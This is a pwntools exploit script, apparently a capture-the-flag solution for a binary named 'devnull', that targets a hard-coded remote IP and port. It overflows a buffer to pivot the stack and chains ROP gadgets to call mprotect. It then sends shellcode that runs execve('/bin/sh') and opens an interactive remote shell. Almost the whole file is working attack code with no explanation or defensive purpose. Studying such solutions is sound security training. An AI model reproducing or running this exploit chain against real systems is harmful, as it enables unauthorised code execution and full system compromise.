# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './devnull'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '182.92.161.17'
    port = '19099'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def attack():
    
    data = 0x3fe000
    mov_rax_leave_ret = 0x0000000000401350
    mprotect_gadget = 0x0000000004012D0
    
    payload  = 'a'*0x20 + p32(0) + p64(data + 0xe0)*3
    payload += p64(data + 0xd8) + p64(mov_rax_leave_ret)
    # dbg()
    sa('filename\n' , payload)
    
    payload = flat(
        mprotect_gadget , data + 0xf0 , data + 0xf8
    )
    payload += asm(
        '''
        xor rax , rax
        mov rdi , rax
        mov rsi , rsp
        mov rdx , 0x300
        syscall
        '''
    )
    
    sa('data\n' , payload)
    
    code = '''
        mov rax , 10
        mov rdi , 0x404000
        mov rsi , 0x1000
        mov rdx , 3
        syscall
    '''
    code += shellcraft.execve('/bin/sh',0,0)
    
    sa('Thanks', '\x90'*0x20 +  asm(code))
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   devnull.py
@Time    :   2022/07/30 14:30:08
@Author  :   Niyah 
'''